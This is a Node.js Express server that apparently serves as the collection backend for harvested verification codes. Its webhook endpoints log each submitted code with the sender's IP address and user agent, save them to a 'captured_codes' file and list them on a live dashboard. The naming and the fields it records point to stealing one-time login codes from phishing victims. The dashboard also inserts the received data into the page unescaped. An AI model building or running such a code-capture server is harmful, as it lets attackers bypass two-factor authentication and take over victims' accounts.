const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3001;

// Middleware
app.use(cors());
app.use(express.json());

// Store codes in memory and file
let capturedCodes = [];

// Webhook endpoint to receive verification codes
app.post('/verify-code', (req, res) => {
    const timestamp = new Date().toISOString();
    const codeData = {
        ...req.body,
        receivedAt: timestamp
    };
    
    // Store in memory
    capturedCodes.push(codeData);
    
    // Log to console
    console.log('🔥 NEW VERIFICATION CODE RECEIVED:');
    console.log('Code:', codeData.verification_code);
    console.log('Time:', timestamp);
    console.log('IP:', codeData.ip_address);
    console.log('User Agent:', codeData.user_agent);
    console.log('-----------------------------------');
    
    // Save to file
    const logFile = path.join(__dirname, 'captured_codes.json');
    fs.writeFileSync(logFile, JSON.stringify(capturedCodes, null, 2));
    
    res.status(200).json({ success: true, message: 'Code received' });
});

// Alternative endpoint for simple code format
app.post('/verify', (req, res) => {
    const timestamp = new Date().toISOString();
    const codeData = {
        ...req.body,
        receivedAt: timestamp
    };
    
    capturedCodes.push(codeData);
    
    console.log('🔥 VERIFICATION CODE:', codeData.code);
    console.log('Time:', timestamp);
    console.log('-----------------------------------');
    
    const logFile = path.join(__dirname, 'captured_codes.json');
    fs.writeFileSync(logFile, JSON.stringify(capturedCodes, null, 2));
    
    res.status(200).json({ success: true });
});

// View captured codes via web interface
app.get('/codes', (req, res) => {
    res.json({
        total: capturedCodes.length,
        codes: capturedCodes.reverse() // Show newest first
    });
});

// Simple web interface
app.get('/', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Verification Code Receiver</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .code { background: #f0f0f0; padding: 10px; margin: 10px 0; border-radius: 5px; }
            .refresh { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
        </style>
    </head>
    <body>
        <h1>📱 Verification Code Receiver</h1>
        <p>Server running on port ${PORT}</p>
        <button class="refresh" onclick="location.reload()">Refresh</button>
        <div id="codes"></div>
        
        <script>
            fetch('/codes')
                .then(r => r.json())
                .then(data => {
                    const div = document.getElementById('codes');
                    div.innerHTML = '<h2>Captured Codes (' + data.total + ')</h2>';
                    data.codes.forEach(code => {
                        div.innerHTML += '<div class="code"><strong>' + 
                            (code.verification_code || code.code) + 
                            '</strong><br>Time: ' + code.receivedAt + 
                            '<br>IP: ' + (code.ip_address || 'N/A') + '</div>';
                    });
                });
        </script>
    </body>
    </html>`;
    res.send(html);
});

app.listen(PORT, () => {
    console.log(`🚀 Webhook server running on http://localhost:${PORT}`);
    console.log(`📱 View codes at: http://localhost:${PORT}`);
    console.log(`🔗 Webhook endpoint: http://localhost:${PORT}/verify-code`);
    console.log('Waiting for verification codes...');
});